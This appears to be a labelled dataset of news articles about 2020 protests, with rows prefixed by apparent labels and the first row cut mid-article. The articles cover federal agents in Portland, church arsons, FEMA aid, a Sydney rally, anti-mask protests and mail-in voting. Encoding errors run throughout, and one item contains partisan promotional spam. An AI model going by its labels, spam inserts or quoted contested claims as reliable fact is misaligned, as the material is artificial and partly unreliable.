made an already-tense environment worse. ""The federal police have their marching orders on how they're going to do things,"" Portland Police Association President Daryl Turner told NPR on Tuesday. ""And that coordination was not made with Portland police."" In response to both the federal actions in Portland and the implied threat by President Trump to deploy federal officers to other U.S. cities, more than a dozen U.S. mayors have sent an open letter to Attorney General William Barr and Chad Wolf, acting secretary of the Department of Homeland Security. The letter calls on the Department of Justice and DHS to withdraw the forces from American cities and halt plans to send any more. ""Deployment of federal forces in the streets of our communities has not been requested nor is it acceptable. While U.S. Marshals have had jurisdiction inside federal courthouses for decades, it is unacceptable and chilling that this administration has formed and deployed the U.S. Department of Homeland Security Rapid Deployment Unit and is sending federal authorities to conduct crowd control on city streets and detain individuals,"" the mayors write. They point to the federal officers' use of less-lethal munitions against protesters that have caused serious injury and to the grabbing of people off the street and pulling them into unmarked vehicles. ""These are tactics we expect from authoritarian regimes â€“ not our democracy,"" the mayors write. On Tuesday, Wolf said, ""Portland is unique,"" arguing that local officials and police hadn't done enough to control what he said was violence stemming from the nightly protests, and saying those protests increasingly threaten federal buildings downtown. Asked about Trump's threat to send federal officers into other cities, Wolf said reporters could ""ask the White House."" Oregon Gov. Kate Brown said the situation in Portland had been starting to calm before federal forces arrived. ""The harsh reality is, this is about scoring political points with [Trump's] base,"" Brown told PBS NewsHour on Monday. ""This is about political theater. If they were really interested in problem-solving or in public safety, they would be willing to de-escalate and engage in dialogue."" She added, ""Instead, they bring more troops to the streets. They take peaceful protesters off into unmarked cars. And, unfortunately, last weekend, they almost killed a peaceful protester. This is absolutely outrageous. It is a violation of the principles on which this country was founded."" NPR thanks our sponsors Become an NPR sponsor"
1,"News Corp is a network of leading companies in the worlds of diversified media, news, education, and information services. A NUMBER of Catholic churches have been torched and vandalized in the US as cops investigate whether this is linked to the ongoing statue protests. Houses of worship are being burned after George Floyd's police custody death in Minneapolis on May 25, which sparked widespread outrage and anti-racism rallies. Black Lives Matter activist Shaun King urged demonstrators to ""tear"" down Jesus Christ statues and murals because he said they are ""a form of white supremacy"" on Twitter. While Confederate monuments are being taken down all over the country, Christian statues are reportedly being vandalized and churches have been set on fire. In the city of Los Angeles, the San Gabriel Mission, a 249-year-old Catholic church, was engulfed in flames in the early hours of Saturday morning. CNN reported that firefighters and emergency responders fought the blaze for three hours as the ancient ceiling and roof began to cave in. The church was preparing to mark its upcoming 250th anniversary celebration before the alleged arson attack, causing severe water and smoke damage. It came under criticism because of the surrounding statues of St Junipero Serra, which have been toppled by BLM protesters in other areas. Critics say the 18th-century Franciscan priest was complicit in an imperial conquest that oppressed Native Americans. ""One of the factors investigators are taking into account is the recent vandalism to the statues of the saint, specifically in the Los Angeles region,"" San Gabriel Fire Department fire captain Antonio Negrete said. â€œThis will be another box that theyâ€™re going to check off,â€ he told Fox11. ""It's a tragic loss for our city. It's our city identifier."" Elsewhere, in San Diego, the police departmentâ€™s Metro Arson Strike Team are investigating a ""suspicious"" 12.30 pm blaze at Calvary Baptist church on Sunday. Although it's a historically Black church, it has become a â€œmulti-cultural faith community,"" as per its website. Around the same time as the LA blaze, a man in Florida mowed his vehicle into the Queen of Peace Catholic Church in Ocala ahead of morning Mass on Saturday. Steven Anthony Shields, 24, from Dunnellon allegedly poured gasoline in the foyer, set the building on fire, and drove off, as per the Marion County Sheriff's Office. He was arrested and charged with attempted murder, arson, burglary, and evading arrest. Shields described the incident as ""awesome,"" saying he was on a ""mission"" as he smiled and laughed, according to an arrest affidavit obtained by the Ocala Star-Banner. He cited issues with the Catholic Church but Shields also reportedly has schizophrenia and isn't taking his medication. Nevertheless, Mass was celebrated Saturday and Sunday, local outlets said, despite the damage to the foyer. Elsewhere, Missouri authorities are looking into a suspected arson attack in Johnson County, where a 100-year-old church went up in flames. Harmony Baptist Church was burned to the ground at 11.22 pm on July 5, according to Johnson County Fire Protection District. It took over two hours for firefighters from four stations and 50,000 gallons of water to get a handle on the raging blaze, which caused between $400,000 and $500,000 of damage. Security camera footage shows the arson suspect parking outside and then entering the building before setting the building alight, local reports said. â€œThe loss of the historic church will have a lasting effect on the rural community and members of the church,"" Fire Chief Larry Jennings told The Sun. ""It will take a community effort to identify those responsible for the fire and to help the congregation as they move forward.â€ It isn't known if this arson attack is connected with the ongoing protests and Jennings said there is no current evidence to suggest it is related as the probe continues. But it's not just churches that are going up in flames. In Massachusetts, cops are investigating a suspected arson attack on a statue of the Virgin Mary on Saturday night. Catholic News Agency reported that the statue is located outside St Peterâ€™s Parish in Bostonâ€™s Dorchester neighborhood. Police responded to a fire on Bowdin Street at around 10 pm on July 11. The statue of Mary sustained heavy damage after an unknown individual set fire to the plastic flower's in the statue's hands. This caused smoke and flame damage to the face, head, and upper body of the statue. A spokesperson for the Archdiocese of Boston described the unknown culprit as ""a troubled soul."" ""Boston Fire Department has just begun its investigation, so we donâ€™t have a sense what was the reason behind this action,"" Terrence C. Donilon, their Secretary for Communications & Public Affairs, told The Sun. ""That said, whoever is responsible for the desecration of the Holy Motherâ€™s statue is clearly a troubled soul. ""Mary represents all that is good and pure in our world. We have confidence in local law enforcement to investigate this matter. We pray for the person or persons responsible."" Another Blessed Virgin Mary statue outside Cathedral Prep School and Seminary in New York City was desecrated on July 10 with the word â€œIDOL."" The NYPD confirmed that they are investigating the vandalization of the statue, which occurred shortly after 3am on Friday, July 10. On the security footage, someone can be seen approaching the 100-year-old statue and spray painting the word across it, before fleeing the scene. The NYPD have appealed to the public for help in identifying the culprit of this ""criminal mischief incident."" Rector and president of Cathedral Prep Fr James Kuroly told The Sun this vandalism was â€œan act of hatred"" on Tuesday. ""I don't think there's a connection per say [with the protests] like it's organized,"" he said. ""I do think it's where we are as a society and as a country where there has been so much division and so much focus on what separates us and when we focus on that division, it leads to ignorance and it leads to acts of hatred. ""It really does symbolize the state of affairs that we are in right now as a society,"" he added. ""There has certainly been an outpouring of support [from the local community].""

1,"Fox 8 Cleveland WJW by: Associated Press GREEN COVE SPRINGS, Fla. (AP) â€” A Florida sheriff says he will deputize every gun owner in his county to put down violent protests his deputies canâ€™t handle alone. Clay County Sheriff Darryl Daniels gave no indication in a three-minute video (which you can see, above) released Wednesday that any demonstrations are planned in his suburban Jacksonville county. Still, he said if anyone starts â€œtearing up Clay County,â€ he would deputize gun owners if needed. Daniels said his office has a â€œgreat relationshipâ€ with the community.

CANTON, Ohio (WJW) â€“ The Canton Police Department say the suspect in a homicide that happened Sunday evening is now in custody. On Tuesday, 37-year-old Nichalous Harvey, of Canton, turned himself in at the Stark County Sheriff's Office. He was arrested without incident, according to police. GASTONIA, N.C. (WJZY) â€“ A North Carolina family is in mourning after they say a 2-year-old boy picked up a gun and accidentally shot and killed his father over the weekend. Phyllis Holland said her 2-year-old great-grandson shot and killed his father, 29-year-old Markovia Durham, inside a Gastonia apartment Sunday. CLEVELAND (WJW) -- Court documents reveal there was a proposed attack on Ohio Gov Mike DeWine by a 'militia' group, the same group that allegedly planned to kidnap Michigan's governor, Gretchen Whitmer, last year. On Monday, a 22-page federal document was filed in the U.S. District Court. In it, a meeting in June 2020 is described where two of the five men, accused in the plot against Whitmer, also discussed an attack on DeWine."
1,"Minnesota, youâ€™re on your own. About a week after Gov. Tim Walz wrote to President Trump requesting federal aid to repair widespread damage in Minneapolis and St. Paul from the fiery George Floyd protests, the Federal Emergency Management Agency rebuffed the request for a financial helping hand. The state has estimated total damages at more than $500 million, and Walz specifically wrote in his July 2 letter that $15 million in cleanup and repair costs could be eligible for federal reimbursement. â€œThe governor is disappointed that the federal government declined his request for financial support ... to help Minnesota rebuild after civil unrest damaged public infrastructure and caused extensive fire damage in the wake of George Floydâ€™s death,â€ spokesman Teddy Tschann said in a statement. â€œAs we navigate one of the most difficult periods in our stateâ€™s history, we look for support from our federal government to help us through,â€ he said. Hundreds of buildings in the Twin Cities were destroyed by fires, looted or damaged during the nightly protests following Floydâ€™s May 25 death beneath the knee of a white Minneapolis cop. A local police precinct was among the structures torched during the demonstrations. Walz noted in his letter that it was â€œthe second most destructive incident of civil unrest in United States history after the 1992 Los Angeles riots.â€ The governor noted the state budget was further crippled by the COVID-19 pandemic, with an anticipated $1.5 billion surplus morphing into a projected deficit of $2.4 billion. FEMA, in a statement provided to Minnesota Public Radio, said the turndown came after a â€œthorough reviewâ€ of the stateâ€™s request for the funds as a major disaster area. â€œIt was determined that the impact to public infrastructure is within the capabilities of the local and state governments to recover from,â€ the statement concluded. Minnesota officials now have 30 days to appeal the federal rejection, with the governorâ€™s spokesman saying his office was â€œexploring more optionsâ€ to resolve its dire financial situation."
1,"A Black Lives Matter rally, billed to attract thousands in Sydney, was shut down by police before it began and its organiser arrested. The event in The Domain, which almost 5000 people had registered on Facebook to attend, came to nothing as NSW Police ordered protesters to disperse, 15 minutes before it was scheduled to begin at midday on Tuesday. See police shut the protest down in the video above Hundreds of police were on duty at the park and six arrests were made. Of the six, five were fined $1000 each and a sixth person, a 25-year-old woman, was issued a criminal infringement notice for offensive language. Organiser Paddy Gibson was one of those arrested and said supporters were asked to gather in groups of fewer than 20 after they failed on Monday to overturn a NSW Supreme Court decision prohibiting the protest. Gibson said organisers directed protesters to leave peacefully and without confronting police after being told mass arrests would otherwise occur. He said heâ€™d been told by police that despite The Domainâ€™s size, only 20 people would be permitted in the park. â€œWe werenâ€™t allowed to give it a run even though Westfield is allowed, as well as the casino and the NRL,â€ the 37 year old said. â€œPeople are allowed to come together to make profits but theyâ€™re not allowed to come together to say black lives matter - thatâ€™s a disgraceful situation in NSW. â€œThey donâ€™t want to see us build unity, build power, demand accountability and demand justice from this government because itâ€™s too politically sensitive.â€ Gibson said protesters would challenge any fines handed out. NSW Police Assistant Commissioner Mick Willing warned that protesters who intended to rally outside NSW parliament on Tuesday would be arrested. Justice Mark Ierace on Sunday accepted the police argument that the possibility of community transmission of COVID-19 arising from the Sydney rally made the event too risky. The appeal court, which will hand down its reasons soon, on Monday dismissed a challenge to Justice Ieraceâ€™s decision. Organisers previously said they would risk arrest and go ahead with the rally before delivering a 90,000-strong petition to NSW Parliament calling for justice for Indigenous man David Dungay Jr. Mr Dungay, aged 26 and a diabetic, died in December 2015 after five prison officers stormed his Sydney jail cell to stop him eating biscuits. Premier Gladys Berejiklian had earlier appealed to â€œpeopleâ€™s conscience and ethical standardsâ€ not to attend. Black Lives Matter rallies have been held around the globe, sparked by the murder of US man George Floyd by police in Minneapolis on May 25."

Virginia state officials ordered the removal of an American flag from the construction site in Richmond, citing concerns that the flag would become a ""target"" for protesters this Fourth of July. The call from the Department of General Services reportedly angered a subcontractor whose company created the flag using tarps in celebration of Independence Day. â€œWhen we saw the flag, we were concerned that it could become a target so we told the contractor to remove it,â€ department spokeswoman Dena Potter told The Washington Post in an email.

1,"'They need to be in their goddamn green-ass uniform and not in Army military camouflage.' By Jeff Schogol | Published Jul 25, 2020 2:02 PM You can be forgiven for thinking that U.S. troops have been dispatched to the streets of Washington, D.C., Portland, and other cities in recent weeks. The news has been rife with concerning videos and images of little green men kitted out with military gear as they confront â€“ and sometimes beat â€“ protesters, including at least one U.S. Naval Academy alumnus. var siteRootDomainParts = window.location.host.split("".""); var siteRootDomain = window.location.host; if ( siteRootDomainParts.length >= 2 ) { siteRootDomain = siteRootDomainParts[siteRootDomainParts.length - 2] + ""."" + siteRootDomainParts[siteRootDomainParts.length - 1]; } cnxps.cmd.push(function () { cnxps({ playerId: ""3c020dea-a94e-40a8-be0a-8a3170cc7c1b"", customParam1: window.empire.apps.ads.targeting.pageId + """", customParam2: window.empire.apps.ads.targeting.section + """", customParam3: window.empire.apps.ads.targeting.keywords + """", settings: { advertising: { macros: { cust_params: ""site="" + siteRootDomain + ""&targeting_article="" + window.empire.apps.ads.targeting.externalId + ""&targeting_section="" + window.empire.apps.ads.targeting.section + ""&targeting_keyword="" + window.empire.apps.ads.targeting.keywords + ""&article="" + window.empire.apps.ads.targeting.pageId, article: window.empire.apps.ads.targeting.pageId, category: window.empire.apps.ads.targeting.section, keywords: window.empire.apps.ads.targeting.keywords, } } } }).render(""404a5343b1434e25bf26b4e6356298bc""); }); But the U.S. government has not declared martial law. The people wearing military camouflage uniforms â€“ and, in some cases, carrying M4 carbines â€“ are from federal law enforcement agencies. They are border patrol officers, U.S. Marshals, and other civilian police officers. They are not U.S. service members, no matter how much they may resemble them. â€œWhen people who have served in the military for a long time have to look very hard at the photos and video from Portland and places like that to tell who these individuals [federal agents] are, then the average citizen is going to easily confuse what they see as a militarized response rather than a law enforcement one,â€ said retired Marine Col. David Lapan, a former spokesman for the chairman of the Joint Chiefs of Staff and the Department of Homeland Security. Indeed, some media outlets have erroneously referred to federal officers as troops â€” and that misperception that the military has assumed a domestic law enforcement role is bad for democracy, according to Lapan â€œIt creates the perception that the U.S. military is being used to suppress the American people.â€ Chad Wolf, the acting head of the Department of Homeland Security, told reporters on Wednesday that border patrol officers are wearing camouflage in Portland because thatâ€™s the uniform they wear when they are deployed to the southwestern border. â€œThat is their everyday uniform and it is completely appropriate,â€ Wolf said at a news briefing. â€œThey have insignia on their uniforms that read police and they have patches â€¦ that indicate which agency they are from.â€ Related: Stop what you're doing and watch this interview with the badass Navy vet who went viral in Portland Meanwhile, the U.S. Marshals in Portland who are wearing military uniforms belong to the agencyâ€™s Special Operations Group, said U.S. Marshals Service spokeswoman Michelle Coghill. â€œSOG relies on established Department of Defense research to ensure the best economic value for taxpayers and a high level of protection for its personnel, and sometimes procures specialized equipment also used by U.S. military forces, including uniforms, helmets, gas masks and protective gear for tactical operations,â€ Coghill told Task & Purpose. The Defense Department doesnâ€™t just provide equipment to the U.S. Marshals Service. Under the 1033 Program, the Defense Logistics Agency transfers a variety of excess military equipment to local police departments, including MRAP-All Terrain Vehicles. Related: A West Virginia town of 8,400 people just picked up an MRAP for some reason However, both Defense Secretary Mark Esper and Army Gen. Mark Milley, chairman of the Joint Chiefs of Staff, have stated that police should be distinguishable from U.S. service members so that the general public does not mistakenly think the military is performing law enforcement duties. The issue first arose during protests in Washington, D.C., in June after National Guardsmen and some federal authorities appeared in similar uniforms, Milley told the House Armed Services Committee recently. â€œYou want a clear distinction â€“ visually â€“ visual distinction between that which is police and that which is military because when you start introducing [the] military, youâ€™re talking a different level of effort there,â€ Milley said during the July 9 hearing. During the 15 years that Iâ€™ve had the honor to tell service membersâ€™ stories, Iâ€™ve learned that troops have no desire to serve as a national police force on American soil. As one crusty noncommissioned officer told me years ago, the militaryâ€™s mission is â€œto go to where the terrorists live and fâ€“k up their neighborhoods.â€ Still, active-duty troops have been used in response to civil unrest in the past, such as during the 1992 Los Angeles Riots. It is also true that service members take an oath to defend the U.S. Constitution against all enemies both foreign and domestic. If thatâ€™s the case, then why is it bad for democracy if Americans have a hard time distinguishing between domestic law enforcement agents and troops? One reason is that the public is generally not in favor of blurring the lines that separate the roles of police and the military, Lapan said. And while the Oath of Enlistment mentions domestic enemies, it was changed around the time of the Civil War because the Southern states had launched an insurrection. Related: Army grounds crew of helicopter that flew low over protests amid official investigation â€œI think the context of â€˜domestic enemiesâ€™ lends itself more to the idea of someone that would try to overthrow the government,â€ Lapan said. â€œWeâ€™re talking about that type of activity, not protests â€“ not even criminal activity.â€ Normally, U.S. troops are used for humanitarian missions inside the United States, such as in the aftermath of Hurricane Katrina, Lapan added. In fact, when Army Lt. Gen. Russel HonorÃ© took command in New Orleans following the devastating 2005 hurricane, one of the first things he did was instill in every first responder that they were not in a war zone. â€œPut those damn weapons down,â€ HonorÃ© barked at both troops and police officers alike. â€œI'm not going to tell you again, goddamn it! Get those goddamn weapons down!â€ Related: Meet the former soldier who gave National Guardsmen in DC an impromptu phalanx lesson in this viral video Now retired, HonorÃ© was just as blunt when he told Task & Purpose that federal law enforcement officers have misappropriated military uniforms in order to look intimidating. â€œLaw enforcement should not be wearing military uniforms,â€ HonorÃ© said. â€œMilitary uniforms are designed to blend into the terrain and itâ€™s a function of identifying our soldiers on the ground. The police need to stay in their lanes.â€ He also said he doesnâ€™t buy Wolfâ€™s explanation that the border patrol is just wearing their normal uniforms. â€œThatâ€™s bullshit,â€ HonorÃ© said. â€œThey need to be in their goddamn green-ass uniform and not in Army military camouflage.â€ â€œSWAT teams, sheriffâ€™s office, border patrol, go get your own goddamned uniforms,â€ he said. â€œThereâ€™s nothing that a camouflage uniform can do for you in an urban operation other than [to] portray a sense of authority that you are big, you are bad, and you are armed.

Ironically, the left-wing rioters didnâ€™t seem to care that he had defended them in the past. ***FIGHT BACK Against Liberal Censorship. Download Our Free Trump News App*** Check out what Fox News reported: Wheeler, who for weeks has been backing the protests against efforts by federal law enforcement to stop rioting near federal property, joined protesters at fencing near the Hatfield Courthouse and tried to conduct a â€œlistening sessionâ€ â€” and was even hit by tear gas deployed by federal agents. However, while some protesters were receptive to his presence, many others heckled and booed him, objecting to his refusal to back some of their demands such as abolishing the police, and for the Portland Policeâ€™s (for which he is a commissioner) use of tear gas and other methods to shut down riots. â€œFâ€” Ted Wheeler,â€ yelled one protester. â€œHe doesnâ€™t get to speak, heâ€™s a fâ€”ing fascist. Fâ€” Ted Wheeler.â€ Later on, a chaotic crowd swarmed him, calling him a â€œfâ€”ing aâ€“holeâ€ while other shouted, â€œTear gas Ted has got to go.â€ After he refused to abolish the police force, the angry crowd got riled up and even threatened to visit his home. â€œF-ck you,â€ â€œget the f-ck outâ€ they yelled, adding, â€œyour house next.â€ ***FREE â€˜Keep America Greatâ€™ hat â€“ OFFER EXPIRES SOON*** WATCH Wheeler get mobbed below: WATCH Wheeler getting tear gassed below: Fox News continues: Scenes devolved and Wheeler was later shuttled to a building by his security team, who had to scuffle with protesters who got in Wheelerâ€™s face, yelled expletives and kicked at the door, which his security team could be seen on video struggling to close. â€œFâ€” you. Fâ€”ing pâ€”ies,â€ members of the crowd yelled, in video posted by Baker, after another member yelled, â€œSee you tomorrow night, huh?â€ But Wheeler isnâ€™t the only mayor to have faced a backlash from protesters, despite their sympathies toward them. Democrat leaders have proven that they have absolutely no control over their cities which is why President Trump is now taking action. During a press briefing on Wednesday, President Trump announced that he would be sending a â€œsurgeâ€ of federal law enforcement agents to Chicago and other major cities after local leadership has failed to stop the massive surge of crime and murder in the city. â€œNo mother should ever have to cradle her dead child in her arms simply because politicians refused to do what is necessary to secure their neighborhood and to secure their city,â€ President Trump said during the press briefing. ***FIGHT BACK Against Liberal Censorship.

The Prime Minister highlighted that it would be difficult for police officers to do so after being verbally and physically attacked by Black Lives Matter protesters. Mr Johnson suggested he wouldn't take the knee out of fear it would make another person's life difficult. Speaking to Nick Ferrari on LBC, Mr Johnson said: ""I don't believe in gestures, I believe in substance. I believe in doing things. ""If you look at what this Government has done over the last few years, when I was running this city, I massively increased black and minority representation in the Metropolitan Police. ""I want to see that happen across the country. ""What we've seen in the last 10 years is young black kids doing the toughest subjects in school, we've seen more young black kids going to the best universities in this country and that's what I want to see.""

""If you think what happened with those police officers standing at the Cenotaph, they were being insulted in quite aggressive terms by some members of the crowd and being told to take the knee. ""Some of them did and it was very difficult then for the others who didn't.  ""I think it's very important that you don't do things that make life difficult or embarrassing for others.""

Anti-mask rallies at Calgaryâ€™s Olympic Plaza and outside the Alberta legislature in Edmonton drew crowds Sunday afternoon as the province continues to deal with the ongoing novel coronavirus pandemic. In Calgary, the rally was held in response to city councilâ€™s upcoming deliberations on mandatory mask usage. Read more: Could masks become mandatory in Calgary? Mayor isnâ€™t ruling it out On Monday, city council is slated to begin discussions on whether masks should be mandatory on transit and some indoor areas where physical distancing measures canâ€™t be followed. A rally against mandatory masks is underway at Olympic Plaza. Crowd chanting â€œno new normal.â€ Calgary city council is set to debate mandating masks at tomorrowâ€™s meeting. #YYC #COVID19 @GlobalCalgary pic.twitter.com/kWvKf73pI8 â€” Adam MacVicar (@AdamMacVicar) July 19, 2020  However, some in the city donâ€™t believe being forced to wear a mask is the answer to stopping the spread of the virus. â€œHaving a choice in this instance is actually very important because there are a lot of categories in our society that are going to be negatively affected by this mask mandate,â€ Eskesen said. Mayor Naheed Nenshi, alongside health and government officials, has repeatedly stressed the importance of wearing a mask when in a crowded indoor space. However, as more businesses continue their operations, Nenshi noted the need is bigger now than ever to stop a resurgence of the virus so the city can continue to rebuild its economy. â€œItâ€™s not mask-wearing or the economy. Itâ€™s wearing a mask to save the economy,â€ Nenshi said Thursday. A crowd also gathered in Edmonton, where protesters carried signs with slogans disparaging mask use. In a news conference Saturday, Premier Jason Kenney also addressed the anti-mask rallies. He noted that while some residents have their reservations about wearing masks, the alternative outcome of a second wave could have devastating effects on the province. â€œMy pitch to those folks, if theyâ€™re upset about mask usage, is that that the alternative will inevitably be more widespread suspensions of economic activity if we get a second outbreak,â€ he said. â€œI think the responsible exercise of personal freedom through mask usage, where people cannot physically distance, is a lot better than suspending businesses or social activity.â€ A protest against making the use of face masks mandatory is underway at the #AbLeg. #YEG pic.twitter.com/8jcYAqL0qS â€” Chris Chacon (@ChrisAChacon) July 19, 2020  Kenney added that while his government doesnâ€™t want to strong-arm the public into wearing face coverings, he hopes residents will take the threat of the virus seriously. â€œAll it takes is the exponential growth of a highly-infectious virus of this nature for it to perspectively come back and overwhelm our health care system,â€ Kenney said. â€œI would much rather that we prevent that through the widespread use of masks rather than the government big-footing in and suspending the operation of all sorts of businesses that would have massive social and economic consequences.â€ But Eskesen is concern about other social consequences. â€œThere are so many people out there that have issues with masks for different reasons, one being claustrophobia. People who are claustrophobic can get a lot of anxiety over wearing a mask, same with people with other anxiety issues, people on the spectrum,â€ he said. â€œPeople with spectrum disorders can have a lot of issues with masks, not just wearing them but interacting with people who have them on, it makes them uncomfortable a lot of the time.â€ Read more: Masks in the mountains: Banff considers mandatory face coverings during COVID-19 pandemic With Calgarians expressing their concerns for mandatory face mask policies at Sundayâ€™s rally, Colin Furness, an infection control epidemiologist and assistant professor at the University of Toronto, noted that many peopleâ€™s reservations on the subject stem from â€œconspiracy theoriesâ€ and inaccurate information. He added thereâ€™s substantial evidence that using face masks will help stop the spread of droplets in the air, and could help slow the spread of the virus. â€œThe emerging evidence for face masks is that they are very effective at doing one thing â€” restraining your own droplets,â€ Furness said. Read more: Coronavirus: University of Alberta study finds growing public support for face masks Furness added that he believes a good start for Calgary would be for businesses to get on board with implementing their own mask protocols, instead of a city-wide policy. â€œI donâ€™t think that imposing fines and really trying to beat people into submission is going to be effective,â€ he said. â€œWhat you need to do is establish a social norm where masks matter.â€. â€“ With files from Kirby Bourne, 630 CHED and Adam MacVicar, Global News Get a roundup of the most important and intriguing national stories delivered to your inbox every weekday.

1,"A Minnesota Representative and trucking company owner is asking federal authorizes to withhold transportation funding if cities continue to allow protests to occur on highways. In a Facebook video, Minnesota Rep. Cal Bahr said that he sent letters to U.S. Attorney General William Barr, U.S. Secretary of Transportation Elaine Chao, Gov. Tim Walz, Minnesota Department of Transportation Commissioner Margaret Anderson Kelliher and Department of Public Safety Commissioner John Harrington requesting they withhold funding transportation if cities continue to allow protests on highways. â€œToday I sent a letter to Attorney General Barr and Governor Walz urging them to put an end to allowing protesters to gather on our interstates. In the past few months, we have seen two of our primary interstates blocked by protesters, putting many lives in danger. The lack of penalties for these actions has encouraged others to protest in this same way,â€ the Facebook post states. â€œI encourage you, your office, along with other federal agencies, to use every tool at your disposal up to and including withholding federal funds if these actions are allowed to continue.â€ â€“ Rep. Cal Bahr, the Facebook post states. In his letter, Bahr, a CDL holder and trucking company owner, referenced the May 31st incident that involved a tanker truck encountering protesters on the highway. â€œAs someone who has a commercial driverâ€™s license myself, I know firsthand how dangerous this situation is for all concerned. On May 31st, a fuel hauler named Bogdan Virechko was trapped on the I-35W Bridge, blocked by protesters, which MNDOT had failed to secure properly. MNDOT has cameras everywhere along that road, and knowing that they had been unable to restrict traffic in that area, they allowed protesters to block it anyway. â€œThe situation could have resulted in many deaths but for the actions of Mr. Virechko, who was beaten by protesters and jailed for his trouble. I donâ€™t need to tell you that allowing situations like this to develop in Minnesota and other states strike at the heart of our interstate commerce system and our rights as citizens to move freely about the country and engage in transactions of all kinds. We are just coming out of a significant supply chain disruption due to the Governmentâ€™s response to COVID-19. The federal government was founded to protect us from these types of local disturbances, and I ask you to intervene to uphold the law to protect commerce at this most basic level,â€ the letter states.

1,"NEW YORK (AP) â€” There is little evidence that the protests that erupted after George Floydâ€™s death caused a significant increase in U.S. coronavirus infections, according to public health experts. If the protests had driven an explosion in cases, experts say, the jumps would have started to become apparent within two weeks â€” and perhaps as early as five days. But that didnâ€™t happen in many cities with the largest protests, including New York, Chicago, Minneapolis, and Washington, D.C. In whatâ€™s considered the first systematic look at the question, a team of economists determined that only one of 13 cities involved in the earliest wave of protests after Memorial Day had an increase that would fit the pattern. It was Phoenix, where experts say cases and hospitalizations surged after a decision by Gov. Doug Ducey to end Arizonaâ€™s stay-at-home order on May 15 and eased restrictions on businesses. Arizona residents who were cooped up for six weeks flooded Phoenix-area bar districts, ignoring social distancing guidelines. In many cities, the protests actually seemed to lead to a net increase in social distancing, as more people who did not protest decided to stay off the streets, said that studyâ€™s lead author, Dhaval Dave of Bentley University. â€œThe large-scale protests can impact both the behavior of the protesters and the behavior of the non-protesters,â€ said Dave. The paper was released last week by the National Bureau of Economic Research, but has not been published by a peer-reviewed journal. Drawing from data compiled by Johns Hopkins University, The Associated Press reviewed trends in daily reported cases in 22 U.S. cities with protests. It found post-protest increases in several cities â€” including Houston and Madison, Wisconsin â€” where experts say other factors were more likely the main drivers. Health officials are still investigating case surges in different states, and more data may come in. But experts believe that if the protests did have a big impact on cases, stronger signs would be apparent now. Floyd was killed on May 25 by a Minneapolis police officer who used his knee to pin Floydâ€™s neck to the ground. The killing of a Black man at the hands of a white officer touched off protests around the United States. Coincidentally, some states had begun to lift social distancing restrictions in late May. Dave and his colleagues counted protests over three weeks in 281 cities with populations of at least 100,000. Most had protests lasting more than three days, and many had protests that had at least 1,000 participants. It's not clear how many protesters participated, let alone how many of them wore masks or got tested after. That may have varied from place to place. Houston is among a number of Texas cities that have recently seen steep increases in cases and hospitalizations. Dr. Umair Shah, executive director of the county health department, believes it was likely some cases could be traced to the protests. ""We just don't know how much,â€ he said. But it's hard to measure the protests' precise impact for a number of reasons, Shah and others said. Earlier business reopenings and more willingness to shrug off social distancing guidelines started the trend in the Houston area, Shah said. Another factor: Many people don't get tested unless they feel symptoms. Many protesters were young adults, who generally are less likely to get severe illness, and therefore may not have gotten tested, experts said. And some who do get tested may still not answer all the questions they are asked by outbreak investigators. â€œI know of three people who told us â€˜Yes, I was at a protest.â€™ That doesn't mean there was not another 25 or more who did attend a protest and just did not share that with us,"" said Dr. Mysheika Roberts, the public health commissioner for the city of Columbus, Ohio. That city has seen increased cases in the last month, but health officials say they can't attribute it to any particular reason other than people socializing and returning to normal activities without wearing masks or taking other precautions. So far, protests don't seem to be a real factor. â€œMost of the protests, at least in my jurisdiction, were outside,â€ and the virus does not spread as well outside, Roberts said. ""And I would say 50% of those at the protests were wearing a face mask."" ___ The Associated Press Health and Science Department receives support from the Howard Hughes Medical Instituteâ€™s Department of Science Education.

1,"â€œYou're never going to have a fair election.â€ With Democrats pushing universal mail-in ballots for all Americans, President Trump on Wednesday said if people can â€œprotest in personâ€ they can â€œvote in person.â€ â€œIF YOU CAN PROTEST IN PERSON, YOU CAN VOTE IN PERSON!â€ Trump wrote on Twitter. IF YOU CAN PROTEST IN PERSON, YOU CAN VOTE IN PERSON! â€” Donald J. Trump (@realDonaldTrump) August 19, 2020  Trumpâ€™s tweet came as protests continue in several major cities following the death of George Floyd May 25 while in the custody of Minneapolis police. While many state governors have enacted stay-at-home regulations for residents, they allow for protesters to gather in large groups, with or without masks. The president said Monday that if universal mail-in voting is allowed, the U.S. is â€œnever going to have a fairâ€ presidential election. In a wide-ranging phone interview with the hosts of â€œFox & Friends,â€ the president said that mail-in voting can allow fraud. â€œI have to tell you that if you go with this universal mail-in â€¦ tens of millions of ballots being sent to everybody and their dogs, dogs are getting them, okay? People that have been dead for 25 years are getting them, you have to see whatâ€™s happening. Then youâ€™re never going to have a fair election,â€ Trump said. Related: The Hidden Difference Between Absentee And Universal Mail-In Voting While fewer than 10 states currently have universal mail-in voting, where ballots are mailed to every registered voter, Democrats are pushing for wider use of the practice, which has prompted the current battle over the U.S. Postal Service (USPS). House Speaker Nancy Pelosi (D-CA) called lawmakers back into session to hold hearings on the USPS. Postmaster General Louis DeJoy announced on Tuesday that he will suspend several cost-cutting initiatives in an effort â€œto avoid even the appearance of any impact on election mail.â€ Trump said heâ€™s currently taking steps to fix what he called a long-term â€œdisasterâ€ in the USPSâ€™s finances. â€œThis isnâ€™t a Trump thing. This has been one of the disasters of the world, the way itâ€™s been run,â€ Trump said. â€œWhat am I supposed to do, let it continue to be run badly?â€ And Trump called Pelosiâ€™s move a â€œcon game,â€ saying there is already ample money available to the USPS. â€œThe Post Office, thereâ€™s $25 billion sitting there, but they really want $1 trillion to bail out their badly run states,â€ Trump said of Democratic lawmakers. Trump also said he would support extending voting to include the weekend before Election Day and adding additional voting booths to ease crowding. â€œI would support all of that. Thatâ€™s what you want to do,â€ Trump said. â€œI would be for opening more voting booths.â€ And the president said heâ€™s OK with absentee voting. â€œI totally support [that],â€ Trump responded. â€œThatâ€™s a great thing.â€ Meanwhile, the Trump campaign and the Republican National Committee (RNC) on Tuesday sued New Jersey over Gov. Phil Murphyâ€™s executive order to send mail-in ballots to all registered voters, saying Murphyâ€™s move is illegal and will create a â€œrecipe for disasterâ€ for voter fraud. â€œIn a direct usurpation of the legislatureâ€™s authority, Gov. Murphy issued Executive Order 177 â€¦ purporting to rewrite the election code for the November 2020 election. This brazen power grab was not authorized by state law and violates both the Elections Clause and Electors Clause of the U.S. Constitution and federal law,â€ the lawsuit alleges.

